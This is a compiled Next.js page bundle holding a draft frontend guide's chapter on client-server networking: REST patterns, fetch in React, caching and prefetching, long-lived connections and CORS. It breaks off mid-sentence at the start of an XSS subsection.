(self.webpackChunk_N_E=self.webpackChunk_N_E||[]).push([[6784],{8387:function(e,s,t){(window.__NEXT_P=window.__NEXT_P||[]).push(["/network",function(){return t(31075)}])},93468:function(e,s,t){"use strict";t.d(s,{E:function(){return Image}});var n=t(85893),r=t(25675),o=t.n(r);function Image(e){let{src:s,alt:t}=e;return(0,n.jsx)(o(),{className:"mt-6 w-full",alt:t,src:s})}},4152:function(e,s,t){"use strict";var n=t(85893),r=t(11163);t(67294);let o={faviconGlyph:"\uD83D\uDCDA",logo:(0,n.jsxs)(n.Fragment,{children:[(0,n.jsx)("span",{className:"font-black",children:"FRONTEND DOCS"}),(0,n.jsx)("span",{className:"font-black text-xs px-2 py-1 ml-2 rounded-md border text-gray-600 border-gray-300 dark:text-gray-400 dark:border-gray-700",children:"DRAFT"})]}),docsRepositoryBase:"https://github.com/tomasreimers/frontend-docs",footer:{component:null},nextThemes:{defaultTheme:"dark"},sidebar:{titleComponent(e){let{type:s,title:t,route:r}=e;return"doc"===s&&["#",""].includes(r)?(0,n.jsx)("span",{className:"text-gray-300 dark:text-neutral-600",title:"Coming soon",children:t}):(0,n.jsx)(n.Fragment,{children:t})}},feedback:{content:(0,n.jsx)(n.Fragment,{children:"Questions? Leave me feedback →"})},editLink:{text:(0,n.jsx)(n.Fragment,{children:"Opinions? Suggest an edit →"})},toc:{extraContent:(0,n.jsxs)("div",{className:"mt-4 text-xs text-gray-500 dark:text-gray-400 contrast-more:text-gray-800 contrast-more:dark:text-gray-50",children:[(0,n.jsx)("p",{children:"Hi! My name is Tomas; I have been programming for the web for 15+ years and developed reactive frontend frameworks at Facebook."}),(0,n.jsx)("p",{className:"mt-2",children:"This site is a ~20-page, front-to-back-readable guide on some of the knowledge, opinions, and intuition I've picked up along the way."}),(0,n.jsx)("p",{className:"mt-2",children:"This is still under development, so feel free to suggest edits or follow me on Twitter for updates."})]})},project:{},search:{component:null},head:()=>{let{asPath:e}=(0,r.useRouter)();return(0,n.jsxs)(n.Fragment,{children:[(0,n.jsx)("meta",{name:"twitter:card",content:"summary_large_image"}),(0,n.jsx)("meta",{name:"twitter:creator",content:"@tomasreimers"}),(0,n.jsx)("meta",{property:"og:image",content:"https://frontenddocs.com/api/og".concat(e,"image.png")})]})},useNextSeoProps:()=>({titleTemplate:"%s – Frontend docs",defaultTitle:"Frontend docs",description:"A ~20-page, front-to-back-readable guide on writing frontend for experienced developers."})};s.Z=o},31075:function(e,s,t){"use strict";t.r(s),t.d(s,{__toc:function(){return h},default:function(){return p}});var n=t(85893),r=t(92673),o=t(66430),i=t(4152);t(59059);var a=t(82643),l=t(93468),c={src:"/_next/static/media/inspector.92e760e5.png",height:1338,width:1690,blurDataURL:"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAgAAAAGCAYAAAD+Bd/7AAAAmElEQVR42gVA0WkDMQx9kiX5KIGuke/uVOhO3SCTZI6DkO9AcHKSLQW6325//ev0i8rnXIvdJ1Qlifg0I/4l2/eZUD/cCsQbRApmHVsXuL/OPMY4ZjJUJKRxqnDm8jiON/ztLtYGRRQeAXBTzDlRVSAljOMFySyrNaG967Z1ZCqqwMTAyjDZ9/3C3HYz9W5GhQJIigtW4dcPm6FVp47hMfUAAAAASUVORK5CYII=",blurWidth:8,blurHeight:6};let h=[{depth:2,value:"Transit protocols",id:"transit-protocols"},{depth:2,value:"REST-ish patterns",id:"rest-ish-patterns"},{depth:3,value:"Uploads",id:"uploads"},{depth:3,value:"Pagination",id:"pagination"},{depth:2,value:"Networking in React",id:"networking-in-react"},{depth:2,value:"Optimization",id:"optimization"},{depth:3,value:"ETags",id:"etags"},{depth:3,value:"Prefetching",id:"prefetching"},{depth:3,value:"Optimistics",id:"optimistics"},{depth:3,value:"Consistency",id:"consistency"},{depth:2,value:"Long lived connections",id:"long-lived-connections"},{depth:2,value:"CORS",id:"cors"},{depth:2,value:"Security",id:"security"},{depth:3,value:"XSS and CSP",id:"xss-and-csp"},{depth:3,value:"CSRF",id:"csrf"},{depth:3,value:"Frames",id:"frames"}];function _createMdxContent(e){let s=Object.assign({h1:"h1",p:"p",h2:"h2",ul:"ul",li:"li",a:"a",code:"code",h3:"h3",pre:"pre",span:"span",ol:"ol",strong:"strong"},(0,a.a)(),e.components);return(0,n.jsxs)(n.Fragment,{children:[(0,n.jsx)(s.h1,{children:"Network: Old page, new data"}),"\n",(0,n.jsx)(s.p,{children:"Eventually, your application is going to want to talk to the server. Either to write new data (because the user updated something), or to read new data (because you believe it may be out of date)."}),"\n",(0,n.jsx)(s.h2,{id:"transit-protocols",children:"Transit protocols"}),"\n",(0,n.jsx)(s.p,{children:"These days, there are two popular options when talking to the server:"}),"\n",(0,n.jsxs)(s.ul,{children:["\n",(0,n.jsxs)(s.li,{children:[(0,n.jsx)(s.a,{href:"https://developer.mozilla.org/en-US/docs/Glossary/REST",children:"REST"}),": The more traditional solution structured with verbs, URLs, and payloads."]}),"\n",(0,n.jsxs)(s.li,{children:[(0,n.jsx)(s.a,{href:"https://graphql.org/",children:"GraphQL"}),": A newer alternative where the server defines what data the client can access through a shared schema, and the client defines what data (both objects and properties) it wants."]}),"\n"]}),"\n",(0,n.jsx)(s.p,{children:"GraphQL was developed at Facebook and has had a lot of development recently (after all, it is newer). Because of that, many startups choose GraphQL. Despite this, I would encourage you to think about do you really need GraphQL: it was developed by Facebook to solve a Facebook-sized problem: frontend developers can't write any backend code, and implementing it comes along with some pretty heavy restrictions (e.g. limiting how you can query for your data or how you have to structure your server)."}),"\n",(0,n.jsx)(s.h2,{id:"rest-ish-patterns",children:"REST-ish patterns"}),"\n",(0,n.jsx)(s.p,{children:"For most developers and organizations, I believe REST (or something similar in spirit) to be the best answer."}),"\n",(0,n.jsx)(s.p,{children:"I say similar to REST, because I don't think you need to abide by the standard exactly (for example, REST would tell you never to query for data using a POST request, I don't know if that's true... many APIs implement query for data over POST because they want to send up a request body; more on this later)."}),"\n",(0,n.jsx)(s.p,{children:"If you've worked with servers before, you've probably encountered REST, and so I'll try to keep this quick."}),"\n",(0,n.jsx)(s.p,{children:"REST is structured as many individual HTTP requests; each request has:"}),"\n",(0,n.jsxs)(s.ul,{children:["\n",(0,n.jsx)(s.li,{children:"A URL"}),"\n",(0,n.jsx)(s.li,{children:'A "verb" (GET, POST, PUT, PATCH, DELETE)'}),"\n",(0,n.jsx)(s.li,{children:"Headers (fields separate from the body)"}),"\n",(0,n.jsx)(s.li,{children:"A body (except for GET requests, GETs have no body)"}),"\n"]}),"\n",(0,n.jsxs)(s.p,{children:["In REST, each URL represents a unique object, and ",(0,n.jsx)(s.a,{href:"https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods",children:"verbs"})," dictate the intention of the request:"]}),"\n",(0,n.jsxs)(s.ul,{children:["\n",(0,n.jsx)(s.li,{children:"GET: Read the object"}),"\n",(0,n.jsx)(s.li,{children:"POST: Create a new object"}),"\n",(0,n.jsx)(s.li,{children:"PUT: Update the object by replacing it"}),"\n",(0,n.jsx)(s.li,{children:"PATCH: Update the object by providing partial fields"}),"\n",(0,n.jsx)(s.li,{children:"DELETE: Deletes the object"}),"\n"]}),"\n",(0,n.jsx)(s.p,{children:"For example,"}),"\n",(0,n.jsxs)(s.ul,{children:["\n",(0,n.jsxs)(s.li,{children:[(0,n.jsx)(s.code,{children:"GET /book/<id>"}),": Get the book with the id ",(0,n.jsx)(s.code,{children:"<id>"})]}),"\n",(0,n.jsxs)(s.li,{children:[(0,n.jsx)(s.code,{children:"POST /books"}),": Create a new book"]}),"\n",(0,n.jsxs)(s.li,{children:[(0,n.jsx)(s.code,{children:"PATCH /book/<id>"}),": Update the book with the id ",(0,n.jsx)(s.code,{children:"<id>"})]}),"\n"]}),"\n",(0,n.jsx)(s.p,{children:"In those requests, parameters can be encoded in:"}),"\n",(0,n.jsxs)(s.ul,{children:["\n",(0,n.jsxs)(s.li,{children:["The URL: for example, ",(0,n.jsx)(s.code,{children:"id"})," above"]}),"\n",(0,n.jsx)(s.li,{children:"The query parameters: anything following a question mark in the URL. In REST, the part of the URL before the question mark represents the object and after represents parameters."}),"\n",(0,n.jsx)(s.li,{children:"The headers: additional request data encoded as a set of key-value pairs"}),"\n",(0,n.jsx)(s.li,{children:"The body: a freeform string sent as part of the request (GET requests don't have a body)"}),"\n"]}),"\n",(0,n.jsxs)(s.p,{children:["The browser will automatically add a lot of headers for you (including things like the user agent, describing your device). One header to call out are ",(0,n.jsx)(s.a,{href:"https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies",children:"cookies"}),": cookies are key value pairs that a server can send to the browser, and the browser will include in any subsequent requests (for example, for authentication)."]}),"\n",(0,n.jsx)(s.p,{children:"The server will recieve the URL, verb, headers, and body and respond with:"}),"\n",(0,n.jsxs)(s.ul,{children:["\n",(0,n.jsx)(s.li,{children:"A document (probably XML or JSON encoded)"}),"\n",(0,n.jsx)(s.li,{children:"A status code"}),"\n"]}),"\n",(0,n.jsxs)(s.p,{children:[(0,n.jsx)(s.a,{href:"https://developer.mozilla.org/en-US/docs/Web/HTTP/Status",children:"Status codes"})," are a coarse grain way to represent the kind of response to the client. For example, 200 means the request was handled as expected, 401 means the client needs to authenticate before making the request, 500 means the client made a well-formed request and the server ran into an issue processing it."]}),"\n",(0,n.jsx)(s.p,{children:"In general,"}),"\n",(0,n.jsxs)(s.ul,{children:["\n",(0,n.jsx)(s.li,{children:"1xx status codes means the server is handling it"}),"\n",(0,n.jsx)(s.li,{children:"2xx status codes means everything is alright"}),"\n",(0,n.jsx)(s.li,{children:"3xx status codes means the server is directing you elsewhere"}),"\n",(0,n.jsx)(s.li,{children:"4xx status codes means the client made a bad request"}),"\n",(0,n.jsx)(s.li,{children:"5xx status codes means the server had an error"}),"\n"]}),"\n",(0,n.jsxs)(s.p,{children:["In Chrome's devtools, the ",(0,n.jsx)(s.a,{href:"https://developer.chrome.com/docs/devtools/network",children:"network inspector"})," can show you past requests and responses."]}),"\n",(0,n.jsx)(l.E,{src:c,alt:"The devtools network inspector"}),"\n",(0,n.jsx)(s.h3,{id:"uploads",children:"Uploads"}),"\n",(0,n.jsx)(s.p,{children:"When working with JSON or XML APIs, one challenge is uploading files."}),"\n",(0,n.jsx)(s.p,{children:"Imagine creating an API for a social media site where users need to be able to upload an image and title."}),"\n",(0,n.jsx)(s.p,{children:"This is challenging because encoding the image is non-trivial. Four ways to do this are:"}),"\n",(0,n.jsxs)(s.ul,{children:["\n",(0,n.jsx)(s.li,{children:"Have a JSON API and send up the file contents as a base64 encoded string (the request body would be a dictionary containing the title string and the body)"}),"\n",(0,n.jsxs)(s.li,{children:["Use ",(0,n.jsx)(s.a,{href:"https://stackoverflow.com/a/19712083",children:"form multipart"})," encoding instead of JSON (a legacy way to send files and data to the server; the request body would have title and image encoded as form multipart)"]}),"\n",(0,n.jsx)(s.li,{children:"Encode the title as a query parameter and have the body be the raw bits of the file (encoded as JPEG or PNG or whatever file format you choose); the downside here is that query parameters must be strings"}),"\n",(0,n.jsx)(s.li,{children:"Break it into two endpoints: one to create the post (takes in title and returns an upload URL), and one that just takes in the bits of the image (encoded as a JPEG or PNG)"}),"\n"]}),"\n",(0,n.jsx)(s.h3,{id:"pagination",children:"Pagination"}),"\n",(0,n.jsx)(s.p,{children:"Another challenge can be returning very long lists. By very long I mean that they couldn't fit in a single network response: for example, Google search results."}),"\n",(0,n.jsx)(s.p,{children:'For this, you need to paginate or turn the single list into many "pages" of results.'}),"\n",(0,n.jsx)(s.p,{children:'Pagination all takes the same form: the client requests a page of results from the server, passing a "cursor" as a parameter. The server responds with a page of results and a new cursor for the next page.'}),"\n",(0,n.jsx)(s.p,{children:"The simplest cursor is a page number, but that can be fragile (for example, what if the list reorders? Will the pages still be continuous?) For this reason, cursors typically encode some way to regenerate that initial list. For example, if writing a cursor for a chronological newsfeed, I might say page 2, only looking at posts from before a certain date. That would guarantee a stable ordering."}),"\n",(0,n.jsx)(s.h2,{id:"networking-in-react",children:"Networking in React"}),"\n",(0,n.jsxs)(s.p,{children:["To actually make a network call from the client, you use the ",(0,n.jsx)(s.a,{href:"https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API",children:"fetch"})," function."]}),"\n",(0,n.jsx)(s.pre,{"data-language":"js","data-theme":"default",children:(0,n.jsxs)(s.code,{"data-language":"js","data-theme":"default",children:[(0,n.jsxs)(s.span,{className:"line",children:[(0,n.jsx)(s.span,{style:{color:"var(--shiki-token-function)"},children:"fetch"}),(0,n.jsx)(s.span,{style:{color:"var(--shiki-color-text)"},children:"("}),(0,n.jsx)(s.span,{style:{color:"var(--shiki-token-string-expression)"},children:"'/api/users'"}),(0,n.jsx)(s.span,{style:{color:"var(--shiki-token-punctuation)"},children:","}),(0,n.jsx)(s.span,{style:{color:"var(--shiki-color-text)"},children:" {"})]}),"\n",(0,n.jsxs)(s.span,{className:"line",children:[(0,n.jsx)(s.span,{style:{color:"var(--shiki-color-text)"},children:"  method"}),(0,n.jsx)(s.span,{style:{color:"var(--shiki-token-keyword)"},children:":"}),(0,n.jsx)(s.span,{style:{color:"var(--shiki-color-text)"},children:" "}),(0,n.jsx)(s.span,{style:{color:"var(--shiki-token-string-expression)"},children:"'POST'"}),(0,n.jsx)(s.span,{style:{color:"var(--shiki-token-punctuation)"},children:","})]}),"\n",(0,n.jsxs)(s.span,{className:"line",children:[(0,n.jsx)(s.span,{style:{color:"var(--shiki-color-text)"},children:"  body"}),(0,n.jsx)(s.span,{style:{color:"var(--shiki-token-keyword)"},children:":"}),(0,n.jsx)(s.span,{style:{color:"var(--shiki-color-text)"},children:" "}),(0,n.jsx)(s.span,{style:{color:"var(--shiki-token-keyword)"},children:"..."}),(0,n.jsx)(s.span,{style:{color:"var(--shiki-token-punctuation)"},children:","})]}),"\n",(0,n.jsx)(s.span,{className:"line",children:(0,n.jsx)(s.span,{style:{color:"var(--shiki-color-text)"},children:"})"})})]})}),"\n",(0,n.jsx)(s.p,{children:"Fetch returns a promise containing the response."}),"\n",(0,n.jsx)(s.p,{children:"Tying this back to React, writing is straight-forward: you do it in response to user actions."}),"\n",(0,n.jsx)(s.pre,{"data-language":"js","data-theme":"default",children:(0,n.jsxs)(s.code,{"data-language":"js","data-theme":"default",children:[(0,n.jsxs)(s.span,{className:"line",children:[(0,n.jsx)(s.span,{style:{color:"var(--shiki-color-text)"},children:"<"}),(0,n.jsx)(s.span,{style:{color:"var(--shiki-token-string-expression)"},children:"button"}),(0,n.jsx)(s.span,{style:{color:"var(--shiki-color-text)"},children:" "}),(0,n.jsx)(s.span,{style:{color:"var(--shiki-token-function)"},children:"onClick"}),(0,n.jsx)(s.span,{style:{color:"var(--shiki-token-keyword)"},children:"="}),(0,n.jsx)(s.span,{style:{color:"var(--shiki-color-text)"},children:"{() "}),(0,n.jsx)(s.span,{style:{color:"var(--shiki-token-keyword)"},children:"=>"}),(0,n.jsx)(s.span,{style:{color:"var(--shiki-color-text)"},children:" {"})]}),"\n",(0,n.jsxs)(s.span,{className:"line",children:[(0,n.jsx)(s.span,{style:{color:"var(--shiki-color-text)"},children:"  "}),(0,n.jsx)(s.span,{style:{color:"var(--shiki-token-function)"},children:"fetch"}),(0,n.jsx)(s.span,{style:{color:"var(--shiki-color-text)"},children:"("}),(0,n.jsx)(s.span,{style:{color:"var(--shiki-token-string-expression)"},children:"'/api/users'"}),(0,n.jsx)(s.span,{style:{color:"var(--shiki-token-punctuation)"},children:","}),(0,n.jsx)(s.span,{style:{color:"var(--shiki-color-text)"},children:" {"})]}),"\n",(0,n.jsxs)(s.span,{className:"line",children:[(0,n.jsx)(s.span,{style:{color:"var(--shiki-color-text)"},children:"    method"}),(0,n.jsx)(s.span,{style:{color:"var(--shiki-token-keyword)"},children:":"}),(0,n.jsx)(s.span,{style:{color:"var(--shiki-color-text)"},children:" "}),(0,n.jsx)(s.span,{style:{color:"var(--shiki-token-string-expression)"},children:"'POST'"}),(0,n.jsx)(s.span,{style:{color:"var(--shiki-token-punctuation)"},children:","})]}),"\n",(0,n.jsxs)(s.span,{className:"line",children:[(0,n.jsx)(s.span,{style:{color:"var(--shiki-color-text)"},children:"    body"}),(0,n.jsx)(s.span,{style:{color:"var(--shiki-token-keyword)"},children:":"}),(0,n.jsx)(s.span,{style:{color:"var(--shiki-color-text)"},children:" "}),(0,n.jsx)(s.span,{style:{color:"var(--shiki-token-keyword)"},children:"..."}),(0,n.jsx)(s.span,{style:{color:"var(--shiki-token-punctuation)"},children:","})]}),"\n",(0,n.jsx)(s.span,{className:"line",children:(0,n.jsx)(s.span,{style:{color:"var(--shiki-color-text)"},children:"  })"})}),"\n",(0,n.jsx)(s.span,{className:"line",children:(0,n.jsx)(s.span,{style:{color:"var(--shiki-color-text)"},children:"}} />"})})]})}),"\n",(0,n.jsx)(s.p,{children:"Reading is a little more complicated. In its simplest form, it looks something like this:"}),"\n",(0,n.jsx)(s.pre,{"data-language":"js","data-theme":"default",children:(0,n.jsxs)(s.code,{"data-language":"js","data-theme":"default",children:[(0,n.jsxs)(s.span,{className:"line",children:[(0,n.jsx)(s.span,{style:{color:"var(--shiki-token-keyword)"},children:"function"}),(0,n.jsx)(s.span,{style:{color:"var(--shiki-color-text)"},children:" "}),(0,n.jsx)(s.span,{style:{color:"var(--shiki-token-function)"},children:"Component"}),(0,n.jsx)(s.span,{style:{color:"var(--shiki-color-text)"},children:"() {"})]}),"\n",(0,n.jsxs)(s.span,{className:"line",children:[(0,n.jsx)(s.span,{style:{color:"var(--shiki-color-text)"},children:"  "}),(0,n.jsx)(s.span,{style:{color:"var(--shiki-token-keyword)"},children:"const"}),(0,n.jsx)(s.span,{style:{color:"var(--shiki-color-text)"},children:" ["}),(0,n.jsx)(s.span,{style:{color:"var(--shiki-token-constant)"},children:"response"}),(0,n.jsx)(s.span,{style:{color:"var(--shiki-token-punctuation)"},children:","}),(0,n.jsx)(s.span,{style:{color:"var(--shiki-color-text)"},children:" "}),(0,n.jsx)(s.span,{style:{color:"var(--shiki-token-constant)"},children:"setResponse"}),(0,n.jsx)(s.span,{style:{color:"var(--shiki-color-text)"},children:"] "}),(0,n.jsx)(s.span,{style:{color:"var(--shiki-token-keyword)"},children:"="}),(0,n.jsx)(s.span,{style:{color:"var(--shiki-color-text)"},children:" "}),(0,n.jsx)(s.span,{style:{color:"var(--shiki-token-function)"},children:"useState"}),(0,n.jsx)(s.span,{style:{color:"var(--shiki-color-text)"},children:"("}),(0,n.jsx)(s.span,{style:{color:"var(--shiki-token-constant)"},children:"null"}),(0,n.jsx)(s.span,{style:{color:"var(--shiki-color-text)"},children:");"})]}),"\n",(0,n.jsxs)(s.span,{className:"line",children:[(0,n.jsx)(s.span,{style:{color:"var(--shiki-color-text)"},children:"  "}),(0,n.jsx)(s.span,{style:{color:"var(--shiki-token-function)"},children:"useEffect"}),(0,n.jsx)(s.span,{style:{color:"var(--shiki-color-text)"},children:"(() "}),(0,n.jsx)(s.span,{style:{color:"var(--shiki-token-keyword)"},children:"=>"}),(0,n.jsx)(s.span,{style:{color:"var(--shiki-color-text)"},children:" {"})]}),"\n",(0,n.jsxs)(s.span,{className:"line",children:[(0,n.jsx)(s.span,{style:{color:"var(--shiki-color-text)"},children:"    "}),(0,n.jsx)(s.span,{style:{color:"var(--shiki-token-function)"},children:"fetch"}),(0,n.jsx)(s.span,{style:{color:"var(--shiki-color-text)"},children:"("}),(0,n.jsx)(s.span,{style:{color:"var(--shiki-token-string-expression)"},children:'"/api/users"'}),(0,n.jsx)(s.span,{style:{color:"var(--shiki-color-text)"},children:")"})]}),"\n",(0,n.jsxs)(s.span,{className:"line",children:[(0,n.jsx)(s.span,{style:{color:"var(--shiki-color-text)"},children:"      "}),(0,n.jsx)(s.span,{style:{color:"var(--shiki-token-function)"},children:".then"}),(0,n.jsx)(s.span,{style:{color:"var(--shiki-color-text)"},children:"((data) "}),(0,n.jsx)(s.span,{style:{color:"var(--shiki-token-keyword)"},children:"=>"}),(0,n.jsx)(s.span,{style:{color:"var(--shiki-color-text)"},children:" "}),(0,n.jsx)(s.span,{style:{color:"var(--shiki-token-constant)"},children:"data"}),(0,n.jsx)(s.span,{style:{color:"var(--shiki-token-function)"},children:".json"}),(0,n.jsx)(s.span,{style:{color:"var(--shiki-color-text)"},children:"())"})]}),"\n",(0,n.jsxs)(s.span,{className:"line",children:[(0,n.jsx)(s.span,{style:{color:"var(--shiki-color-text)"},children:"      "}),(0,n.jsx)(s.span,{style:{color:"var(--shiki-token-function)"},children:".then"}),(0,n.jsx)(s.span,{style:{color:"var(--shiki-color-text)"},children:"((data) "}),(0,n.jsx)(s.span,{style:{color:"var(--shiki-token-keyword)"},children:"=>"}),(0,n.jsx)(s.span,{style:{color:"var(--shiki-color-text)"},children:" {"})]}),"\n",(0,n.jsxs)(s.span,{className:"line",children:[(0,n.jsx)(s.span,{style:{color:"var(--shiki-color-text)"},children:"        "}),(0,n.jsx)(s.span,{style:{color:"var(--shiki-token-function)"},children:"setResponse"}),(0,n.jsx)(s.span,{style:{color:"var(--shiki-color-text)"},children:"(data);"})]}),"\n",(0,n.jsx)(s.span,{className:"line",children:(0,n.jsx)(s.span,{style:{color:"var(--shiki-color-text)"},children:"      });"})}),"\n",(0,n.jsxs)(s.span,{className:"line",children:[(0,n.jsx)(s.span,{style:{color:"var(--shiki-color-text)"},children:"  }"}),(0,n.jsx)(s.span,{style:{color:"var(--shiki-token-punctuation)"},children:","}),(0,n.jsx)(s.span,{style:{color:"var(--shiki-color-text)"},children:" []);"})]}),"\n",(0,n.jsx)(s.span,{className:"line",children:" "}),"\n",(0,n.jsxs)(s.span,{className:"line",children:[(0,n.jsx)(s.span,{style:{color:"var(--shiki-color-text)"},children:"  "}),(0,n.jsx)(s.span,{style:{color:"var(--shiki-token-comment)"},children:"// ..."})]}),"\n",(0,n.jsx)(s.span,{className:"line",children:(0,n.jsx)(s.span,{style:{color:"var(--shiki-color-text)"},children:"}"})})]})}),"\n",(0,n.jsxs)(s.p,{children:["However, this doesn't handle things like retries, failed requests, race conditions, or if the component is unmounted before the request returns. You probably don't want to implement data fetch yourself, and there are many good libraries that will handle this for you (such as ",(0,n.jsx)(s.a,{href:"https://tanstack.com/query/latest/docs/framework/react/overview",children:"React Query"})," and ",(0,n.jsx)(s.a,{href:"https://swr.vercel.app/",children:"SWR"}),")."]}),"\n",(0,n.jsx)(s.p,{children:"Lastly, in the same vein to the advice that the same component shouldn't have both layout and business logic in React, the same component shouldn't have both data fetch and layout. Separate concerns."}),"\n",(0,n.jsx)(s.h2,{id:"optimization",children:"Optimization"}),"\n",(0,n.jsxs)(s.p,{children:["As apps scale, they start to make a lot of requests. Fortunately, the browser already does a lot of optimization for you. For example, with ",(0,n.jsx)(s.a,{href:"https://stackoverflow.com/a/36519379",children:"HTTP/2"}),", multiple requests to the same origin can be batched, saving you time on establishing a connection. However, there are still multiple app-level optimizations that can improve the real and perceived performance of the application."]}),"\n",(0,n.jsx)(s.h3,{id:"etags",children:"ETags"}),"\n",(0,n.jsxs)(s.p,{children:[(0,n.jsx)(s.a,{href:"https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/ETag",children:"ETags"}),' are basically cache keys for web pages. For example, when you request an image, the server sends down a header saying here is a hash of the image. On subsequent requests, the client can send up the hash and say "here is what I have, only send me the contents if it\'s different".']}),"\n",(0,n.jsx)(s.p,{children:"While primarily used for assets, you can also set ETags on API responses. For example, if you're displaying a text file to a user, you can set an ETag to prevent having to resend the file every time."}),"\n",(0,n.jsx)(s.h3,{id:"prefetching",children:"Prefetching"}),"\n",(0,n.jsx)(s.p,{children:"If you know you will soon need some data, you can request it ahead of time. For example, if you are showing a link to another page, you can fetch the data for that page when the link is rendered or scrolled into view."}),"\n",(0,n.jsx)(s.p,{children:"Most applications need some data before they can render anything (if nothing else, who is the current user? Are they signed in?). In server-rendered applications, this data can be inlined to the initial load with a script tag, but in single page apps, where the application is cached and queries the server for everything, any load begins with a second request for data."}),"\n",(0,n.jsx)(s.p,{children:"This request can slow down applications significantly, because, before anything shows up to the user:"}),"\n",(0,n.jsxs)(s.ol,{children:["\n",(0,n.jsx)(s.li,{children:"The browser has to fetch the app"}),"\n",(0,n.jsx)(s.li,{children:"Parse and run the JavaScript"}),"\n",(0,n.jsx)(s.li,{children:"Make the subsequent request for data"}),"\n",(0,n.jsx)(s.li,{children:"Render the application"}),"\n"]}),"\n",(0,n.jsxs)(s.p,{children:["In cases where you know the browser will start with a request for data, you can hint this with ",(0,n.jsx)(s.a,{href:"https://developer.mozilla.org/en-US/docs/Glossary/Prefetch",children:"prefetch"}),":"]}),"\n",(0,n.jsx)(s.pre,{"data-language":"html","data-theme":"default",children:(0,n.jsx)(s.code,{"data-language":"html","data-theme":"default",children:(0,n.jsxs)(s.span,{className:"line",children:[(0,n.jsx)(s.span,{style:{color:"var(--shiki-color-text)"},children:"<"}),(0,n.jsx)(s.span,{style:{color:"var(--shiki-token-string-expression)"},children:"link"}),(0,n.jsx)(s.span,{style:{color:"var(--shiki-color-text)"},children:" "}),(0,n.jsx)(s.span,{style:{color:"var(--shiki-token-function)"},children:"rel"}),(0,n.jsx)(s.span,{style:{color:"var(--shiki-token-keyword)"},children:"="}),(0,n.jsx)(s.span,{style:{color:"var(--shiki-token-string-expression)"},children:'"prefetch"'}),(0,n.jsx)(s.span,{style:{color:"var(--shiki-color-text)"},children:" "}),(0,n.jsx)(s.span,{style:{color:"var(--shiki-token-function)"},children:"href"}),(0,n.jsx)(s.span,{style:{color:"var(--shiki-token-keyword)"},children:"="}),(0,n.jsx)(s.span,{style:{color:"var(--shiki-token-string-expression)"},children:'"/api/current_user"'}),(0,n.jsx)(s.span,{style:{color:"var(--shiki-color-text)"},children:" />"})]})})}),"\n",(0,n.jsx)(s.p,{children:"This allows the browser to make this request ahead of time, and immediately pass the response to the JavaScript after it loads and makes the request."}),"\n",(0,n.jsx)(s.h3,{id:"optimistics",children:"Optimistics"}),"\n",(0,n.jsx)(s.p,{children:"While reads can usually be optimized with ETags and prefetching, writes are a little harder to optimize because you won't know the request you need to make until you need to make it."}),"\n",(0,n.jsx)(s.p,{children:'While you may not be able to optimize the performance of the request, you can make it appear faster. For example, if a user posts a comment you can show that comment as posted before the network request has completed. This strategy is called "optimistics" and is frequently implemented across networking libraries.'}),"\n",(0,n.jsx)(s.h3,{id:"consistency",children:"Consistency"}),"\n",(0,n.jsx)(s.p,{children:"At the core of these optimizations is a desire to hide the network from the user (and make it appear as if all of the data is stored locally)."}),"\n",(0,n.jsx)(s.p,{children:"One of the effects that breaks this illusion is when data updates in one place but not all the others. For example, if I update my profile picture, but some profile pictures are updated and others aren't (as new network responses are received). Consistency is a technique where you store entities received from the network in some global, reactive store (such as MobX or Recoil) and update the UI accordingly."}),"\n",(0,n.jsx)(s.p,{children:"For example, if you had a global dictionary of users (keyed by ID), you can update it any time you receive a new user, and return an handle to a consistent object."}),"\n",(0,n.jsx)(s.h2,{id:"long-lived-connections",children:"Long lived connections"}),"\n",(0,n.jsx)(s.p,{children:"Sometimes, data gets stale fast. For example, a chat app, where the person you're chatting with could message you at any moment. To keep data up to date, there are four general strategies:"}),"\n",(0,n.jsxs)(s.ol,{children:["\n",(0,n.jsxs)(s.li,{children:[(0,n.jsx)(s.strong,{children:"Polling"}),": Query your server every N seconds asking for new data."]}),"\n",(0,n.jsxs)(s.li,{children:[(0,n.jsx)(s.strong,{children:"Long polling"}),': Poll, but rather than sending a "no new data" response immediately if there are no new messages, just keep the connection open and don\'t respond until either there is a message or you time out the requests (most browsers and servers impose a maximum limit on the time of a request).']}),"\n",(0,n.jsxs)(s.li,{children:[(0,n.jsx)(s.strong,{children:"Websockets"}),": A technology that allows you to ",(0,n.jsx)(s.a,{href:"https://developer.mozilla.org/en-US/docs/Web/API/WebSockets_API",children:"keep a connection alive"})," between a client and a server and pass messages in between. This requires you to keep the server alive and write it to accept websockets."]}),"\n",(0,n.jsxs)(s.li,{children:[(0,n.jsx)(s.strong,{children:"Push"}),": A newer technology allowing the server to ",(0,n.jsx)(s.a,{href:"https://developer.mozilla.org/en-US/docs/Web/API/Push_API",children:"push messages"})," to the client via a service worker."]}),"\n"]}),"\n",(0,n.jsx)(s.p,{children:"All of these are viable strategies, and which one is right depends on the situation."}),"\n",(0,n.jsx)(s.h2,{id:"cors",children:"CORS"}),"\n",(0,n.jsx)(s.p,{children:"By default, websites can only make fetch requests to other URLs on their domain. However, cross-origin resource sharing (or CORS) is a protocol that allows servers to say that other domains can access them."}),"\n",(0,n.jsxs)(s.p,{children:[(0,n.jsx)(s.a,{href:"https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS",children:"CORS"})," is set up via headers, and is usually implemented by a server library."]}),"\n",(0,n.jsx)(s.p,{children:"Note: for non-GET requests, not having the right CORS headers doesn't prevent the client from making the request, it prevents it from reading the response. However, if you don't have CSRF protection (discussed below) a malicious client could still trigger your API."}),"\n",(0,n.jsx)(s.h2,{id:"security",children:"Security"}),"\n",(0,n.jsx)(s.p,{children:"The network is really the first time people think about security, and so I wanted to briefly touch on some best practices here. At first I debated making this a whole chapter, but for most people working in frontend codebases for the first time, someone else will have set this up for you."}),"\n",(0,n.jsxs)(s.p,{children:["While there is a lot we could talk about in terms of ",(0,n.jsx)(s.a,{href:"https://en.wikipedia.org/wiki/SQL_injection",children:"SQL injection"})," or ",(0,n.jsx)(s.a,{href:"https://en.wikipedia.org/wiki/HTTPS",children:"HTTPS"}),", I'm going to assume that you've been exposed to the backend and focus on frontend specific attacks."]}),"\n",(0,n.jsx)(s.h3,{id:"xss-and-csp",children:"XSS and CSP"}),"\n",(0,n.jsx)(s.p,{children:"A classic attack is to try and inject HTML into user generated content that will be rendered. For example, imagine I post the following to my 